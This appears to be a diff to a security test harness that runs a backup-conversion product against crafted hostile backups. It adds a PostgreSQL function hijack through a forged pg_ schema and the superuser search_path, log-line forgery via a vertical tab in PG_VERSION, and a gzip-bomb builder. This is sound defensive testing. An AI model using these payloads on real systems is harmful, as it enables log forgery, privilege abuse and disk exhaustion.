@@ -463,10 +463,14 @@ def scan_leaks(texts, canaries):
     return {name: (value in blob) for name, value in canaries.items()}
 
 
-def run_product(lab, backup, *, test_mode=True, bypass_verdict=False, observe=None, convert=True):
-    """check() then convert() (product code) on `backup`; returns a result dict (structure only)."""
+def run_product(lab, backup, *, test_mode=True, bypass_verdict=False, observe=None, convert=True, guard_floor=None):
+    """check() then convert() (product code) on `backup`; returns a result dict (structure only). `guard_floor`: a
+    lab floor for the product's SpaceGuard (bytes that must stay free; the mechanism is the product's)."""
     res = {'check': None, 'convert': None, 'simulated': []}
     work = LabWork(backup, lab.scratch, new_job_id(), lab.runner)
+    if guard_floor is not None:
+        work.guard = SpaceGuard([str(work.staging), str(LAB_STORAGE)], guard_floor)
+        res['lab_guard_floor_gib'] = round(guard_floor / 1024 ** 3, 2)
     target = lab.target()
     out_dir = lab.scratch / ('out-' + work._tmp.job_id)
     patches = [mock.patch.object(omni, 'Target', lambda w, a: target),
@@ -506,6 +510,7 @@ def run_product(lab, backup, *, test_mode=True, bypass_verdict=False, observe=No
             except BackupError as error:
                 res['check'] = {'ok': False, 'code': error.code, 'message_head': error.message[:90],
                                 'seconds': round(time.monotonic() - t0, 1)}
+                res['_check_message'] = error.message
                 texts.append(json.dumps(error.as_dict(), ensure_ascii=False))
             if convert:
                 for role in list(work._tmp.containers):
@@ -530,6 +535,7 @@ def run_product(lab, backup, *, test_mode=True, bypass_verdict=False, observe=No
                 except BackupError as error:
                     res['convert'] = {'ok': False, 'code': error.code, 'message_head': error.message[:100],
                                       'seconds': round(time.monotonic() - t0, 1)}
+                    res['_convert_message'] = error.message
                     texts.append(json.dumps(error.as_dict(), ensure_ascii=False, default=str))
                     texts.append(str(error))
                     # the failed command's stderr is kept on the exception only (never shown or logged by the
@@ -542,6 +548,7 @@ def run_product(lab, backup, *, test_mode=True, bypass_verdict=False, observe=No
     finally:
         texts += work.lines
         res['log_lines'] = len(work.lines)
+        res['_lines'] = list(work.lines)
         res['_texts'] = texts
         res['left_after_cleanup'] = work.close()
         res['_out_dir'] = str(out_dir)
@@ -586,6 +593,8 @@ PROBE_SQL = """SELECT json_build_object(
     WHERE n.nspname = 'public' AND c.relkind IN ('r','p')),
  'canary_user_rows', (SELECT count(*) FROM public.users WHERE id LIKE 'atk%'),
  'active_tasks', (SELECT count(*) FROM public.scheduled_tasks WHERE state = 1),
+ 'task_states', (SELECT coalesce(json_object_agg(state, n ORDER BY state), '{}') FROM
+    (SELECT state, count(*) AS n FROM public.scheduled_tasks GROUP BY state) s),
  'db_settings', (SELECT count(*) FROM pg_db_role_setting s JOIN pg_database d ON d.oid = s.setdatabase),
  'auto_conf', (SELECT count(*) FROM pg_file_settings WHERE sourcefile ~ 'auto'))"""
 
@@ -619,12 +628,12 @@ def probe_restored(lab, db_tar, tag):
     def norm(text):
         return b'\n'.join(line for line in text.splitlines() if not line.startswith(b'--')
                           and not line.startswith(b'\\restrict') and not line.startswith(b'\\unrestrict'))
-    same_keys = {k: got.get(k) == want.get(k) for k in want if k not in ('canary_user_rows', 'active_tasks')}
+    same_keys = {k: got.get(k) == want.get(k) for k in want if k not in ('canary_user_rows', 'active_tasks', 'task_states')}
     return {'objects_equal_live': all(same_keys.values()), 'differs': sorted(k for k, v in same_keys.items() if not v),
             'restored': {k: got.get(k) for k in ('functions', 'user_triggers', 'rules', 'views', 'policies',
                                                  'event_triggers', 'schemas', 'roles', 'superusers', 'role_settings',
                                                  'large_objects', 'extensions', 'domains', 'comments_user',
-                                                 'canary_user_rows', 'active_tasks', 'sequences')},
+                                                 'canary_user_rows', 'active_tasks', 'task_states', 'sequences')},
             'signature_equal_live': sig_r == sig_l,
             'schema_dump_equal_live': norm(dump_r) == norm(dump_l),
             'schema_dump_sha256': sha256_bytes(norm(dump_r))}
@@ -825,6 +834,122 @@ END $d$;
 """
 
 
+# ====================================================================== iteration 2 (2026-11-23 late): the re-review
+
+# What str.splitlines() splits on: the page reads a job's log through JobStore.read_log, which uses it.
+LINE_BREAKS = '\n\r\x0b\x0c\x1c\x1d\x1e\x85  '
+# v2b: the KEYS of HA's answers are HA's. A plpgsql json_build_object with DETAIL_SQL's exact argument types (its 11
+# exact matches beat the builtin VARIADIC "any"), first on the superuser's per-role search_path (SR-1/SR-2's
+# primitive), adds one key whose name holds a line break, U+2028 and 300 characters (verifier finding 2026-11-23:
+# SR-4 class in the SR-1 fix). The new cluster (this device's schema) never has that key: HA_ANSWERS_DIFFER names it.
+_JB_ARGS = ', '.join(['text', 'bigint', 'text', 'bigint', 'text', 'json'] + ['text', 'bigint'] * 8)
+FORGED_KEY_SQL = "E'atk\\n2026-11-23T15:00:00Z JOB DONE: every app imported\\u2028' || pg_catalog.repeat('y', 300)"
+V2B_FORGED_NAMES = (r"""
+CREATE SCHEMA atk_jb;
+UPDATE pg_catalog.pg_namespace SET nspname = 'pg_atkjb' WHERE nspname = 'atk_jb';
+CREATE FUNCTION pg_atkjb.json_build_object(""" + _JB_ARGS + r""") RETURNS json LANGUAGE plpgsql AS $f$
+BEGIN
+  RETURN (pg_catalog.json_build_object($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17,
+          $18, $19, $20, $21, $22)::jsonb || pg_catalog.jsonb_build_object(""" + FORGED_KEY_SQL + r""", 1))::json;
+END $f$;
+INSERT INTO pg_depend VALUES ('pg_proc'::regclass, 'pg_atkjb.json_build_object(""" + _JB_ARGS + r""")'::regprocedure,
+  0, 'pg_extension'::regclass, (SELECT oid FROM pg_extension WHERE extname = 'pg_trgm'), 0, 'e');
+ALTER ROLE postgres SET search_path = pg_atkjb, pg_catalog, public;
+""")
+# v6: the page's test mode on HA tasks in every lifecycle state. Vendor omnigent 0.21.0: db/db_models.py:1557-1561
+# (active=1, paused=2, deleted=3, completed=4); only active rows are dispatched (stores/scheduled_task_store/
+# sqlalchemy_store.py:314, 335, 1022, 1112). Every HA task made active, plus four copies in states 1, 2, 3, 4.
+V6_TASK_STATES = r"""DO $d$ DECLARE r public.scheduled_tasks; i int; BEGIN
+  SELECT * INTO r FROM public.scheduled_tasks ORDER BY id LIMIT 1;
+  IF NOT FOUND THEN RAISE EXCEPTION 'no scheduled task to copy'; END IF;
+  UPDATE public.scheduled_tasks SET state = 1;
+  FOR i IN 1..4 LOOP
+    r.id := pg_catalog.decode(pg_catalog.md5('atk-task-' || i), 'hex');
+    r.name := 'atk task ' || i;
+    r.state := (ARRAY[1, 2, 3, 4])[i];
+    INSERT INTO public.scheduled_tasks SELECT (r).*;
+  END LOOP;
+END $d$;
+"""
+# v7: HA's PG_VERSION is HA's. PostgreSQL reads only its first token's number ("16."), the engine logs the file's
+# text (16 ASCII characters) in the job log; \x0b is not \r or \n (JobStore.append_log replaces only those) but
+# str.splitlines() splits on it (JobStore.read_log, what the page shows).
+V7_PG_VERSION = b'16.\x0bFORGED OK\n'
+
+
+def replay_log(lines):
+    """The lines a job logged, through the REAL jobs.JobStore (append_log, then read_log as the page reads them)."""
+    from woowbackup import jobs
+    folder = tempfile.mkdtemp(prefix='joblog-', dir=str(Path(tempfile.gettempdir())))
+    try:
+        store = jobs.JobStore(SimpleNamespace(jobs=folder))
+        job = jobs.new_job_id()
+        for line in lines:
+            store.append_log(job, line)
+        read = store.read_log(job, limit=100000)
+        return {'lines_logged': len(lines), 'lines_read_back': len(read),
+                'forged_line_read_back': any(line.startswith('FORGED') for line in read),
+                'line_breaks_in_file': sum(store.log_path(job).read_text('utf-8', 'replace').count(c)
+                                           for c in LINE_BREAKS if c not in '\n')}
+    finally:
+        shutil.rmtree(folder, ignore_errors=True)
+
+
+class Zeros:
+    def __init__(self, size):
+        self.left = size
+
+    def read(self, n=-1):
+        n = self.left if n is None or n < 0 else min(n, self.left)
+        self.left -= n
+        return bytes(n)
+
+
+def build_bomb(path, declared):
+    """v8: an HA backup whose Omnigent member is a gzip bomb: one honest PostgreSQL file header of `declared` bytes of
+    zeros (stored ~1000:1). Streamed: the inflated tar never exists anywhere but in the product's own pass."""
+    member = Path(str(path) + '.member')
+    with open(member, 'xb') as raw, gzip.GzipFile(fileobj=raw, mode='wb', compresslevel=1, mtime=0) as gz, \
+            tarfile.open(fileobj=gz, mode='w|', format=tarfile.PAX_FORMAT, copybufsize=1 << 20) as tar:
+        def add(name, kind='file', data=b'', mode=None):
+            info = tarfile.TarInfo(name)
+            info.type = tarfile.DIRTYPE if kind == 'dir' else tarfile.REGTYPE
+            info.mode = mode if mode is not None else (0o755 if kind == 'dir' else 0o644)
+            info.mtime = time.time()
+            if kind == 'file':
+                info.size = len(data)
+            tar.addfile(info, io.BytesIO(data) if kind == 'file' else None)
+        add('.', 'dir')
+        add('./addon.json', data=addon_json())
+        add('data', 'dir')
+        add(omni.PG_PREFIX, 'dir', mode=0o700)
+        add(f'{omni.PG_PREFIX}/PG_VERSION', data=b'16\n', mode=0o600)
+        add(f'{omni.PG_PREFIX}/base', 'dir', mode=0o700)
+        add(f'{omni.PG_PREFIX}/base/5', 'dir', mode=0o700)
+        info = tarfile.TarInfo(f'{omni.PG_PREFIX}/base/5/16384')
+        info.size, info.mode, info.mtime = declared, 0o600, time.time()
+        tar.addfile(info, Zeros(declared))
+        for parent in ('data/omnigent-home', 'data/omnigent-home/.omnigent'):
+            add(parent, 'dir')
+    data = member.read_bytes()
+    member.unlink()
+    doc = hafixtures.ha_doc(addons=(SLUG_FULL,), compressed=True)
+    doc['addons'][0].update({'name': 'Omnigent', 'version': '0.1.23'})
+    outer = hafixtures.outer_bytes([(f'./{SLUG_FULL}.tar.gz', data)], doc)
+    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
+    with os.fdopen(fd, 'wb') as handle:
+        handle.write(outer)
+    return len(outer), len(data)
+
+
+def message_shape(message):
+    """Structure of a product message that names HA-chosen text: no values, only what a forged name could do."""
+    names = message.split('不一致的項目：', 1)[1] if '不一致的項目：' in message else ''
+    longest = max((len(m.group(0)) for m in re.finditer(r'y+', message)), default=0)
+    return {'length': len(message), 'line_breaks': sum(message.count(c) for c in LINE_BREAKS),
+            'longest_attacker_run': longest, 'names_shown': names[:200]}
+
+
 def run_variant(lab, builder, name, results, canaries):
     """Build one crafted backup, run the product on it, probe what a restore would install; structure only."""
     t0 = time.monotonic()
@@ -868,14 +993,52 @@ def run_variant(lab, builder, name, results, canaries):
             path, size, _ = builder.build(name, v5_leak(canary))
             res['backup_bytes'] = size
             res['real'] = run_product(lab, path, convert=True)
+        elif name == 'v2b-forged-answer-names':
+            path, size, _ = builder.build(name, V2B_FORGED_NAMES)
+            res['backup_bytes'] = size
+            res['real'] = run_product(lab, path, test_mode=False)
+            msg = res['real'].pop('_convert_message', '')
+            res['real']['convert_message_shape'] = message_shape(msg)
+            res['real']['job_log_replay'] = replay_log(res['real']['_lines'] + ([msg] if msg else []))
+        elif name == 'v6-test-mode-states':
+            path, size, _ = builder.build(name, V6_TASK_STATES)
+            res['backup_bytes'] = size
+            res['test_mode'] = run_product(lab, path, test_mode=True)
+            res['no_test_mode'] = run_product(lab, path, test_mode=False)
+        elif name == 'v6b-lies-test-mode':
+            path, size, _ = builder.build(name, V2_LIES)
+            res['backup_bytes'] = size
+            res['test_mode'] = run_product(lab, path, test_mode=True)
+        elif name == 'v7-pg-version-log':
+            path, size, _ = builder.build(name, '', pg_extra=[('PG_VERSION', V7_PG_VERSION)])
+            res['backup_bytes'] = size
+            res['real'] = run_product(lab, path, test_mode=True)
+            res['real']['job_log_replay'] = replay_log(res['real']['_lines'])
+            res['real']['logged_version_line_has_break'] = any(
+                'PostgreSQL 16.' in line and any(c in line for c in LINE_BREAKS) for line in res['real']['_lines'])
+        elif name == 'v8-gzip-bomb':
+            require_room(name)
+            declared = 3 * 1024 ** 3
+            path = lab.scratch / 'attack-v8-gzip-bomb.tar'
+            size, member_bytes = build_bomb(path, declared)
+            res['backup_bytes'], res['member_bytes'], res['declared_inflated_bytes'] = size, member_bytes, declared
+            free_before = free_disk()
+            floor = free_before - 1024 ** 3     # at most ~1 GiB (+ one 64 MiB guard step) may be written
+            res['real'] = run_product(lab, path, convert=False, guard_floor=floor)
+            res['real']['simulated'].append('lab floor for the product SpaceGuard: free space at start minus 1 GiB '
+                                            '(production: the running reserve plus WATCH_MARGIN)')
+            res['free_gib_before'] = round(free_before / 1024 ** 3, 2)
+            res['free_gib_after'] = round(free_disk() / 1024 ** 3, 2)
         else:
             raise SystemExit(f'unknown variant {name}')
-        for key in ('real', 'fooled'):
+        for key in ('real', 'fooled', 'test_mode', 'no_test_mode'):
             run = res.get(key)
             if not run:
                 continue
             run['leaks'] = scan_leaks(run.pop('_texts'), canaries)
             run['unsurfaced_stderr_has'] = scan_leaks([run.pop('_stderr', '')], canaries)
+            for private in ('_lines', '_check_message', '_convert_message'):
+                run.pop(private, None)
             if run.get('volumes'):
                 db_tar = run['volumes']['omnigent-postgres-data']
                 run['restored_probe'] = probe_restored(lab, db_tar, f'{name[:6]}{key[:2]}')
@@ -1050,6 +1213,8 @@ def main(argv):
                 run['simulated'].append('the live target has a sequence public.atk_seq (a future schema); '
                                         'observation hook reads it before the restore role is dropped')
                 run['leaks'] = scan_leaks(run.pop('_texts'), canaries)
+                for private in ('_lines', '_check_message', '_convert_message', '_stderr'):
+                    run.pop(private, None)
                 run['hook'] = hook
                 if run.get('volumes'):
                     run['restored_probe'] = probe_restored(lab, run['volumes']['omnigent-postgres-data'], 'v4c')
@@ -1076,6 +1241,8 @@ def main(argv):
                     run = run_product(lab, path, convert=True)
                 run['simulated'].append('observation hook reads the new cluster before the restore role is dropped')
                 run['leaks'] = scan_leaks(run.pop('_texts'), canaries)
+                for private in ('_lines', '_check_message', '_convert_message', '_stderr'):
+                    run.pop(private, None)
                 run['hook'] = hook
                 if run.get('volumes'):
                     run['restored_probe'] = probe_restored(lab, run['volumes']['omnigent-postgres-data'], 'v4b')
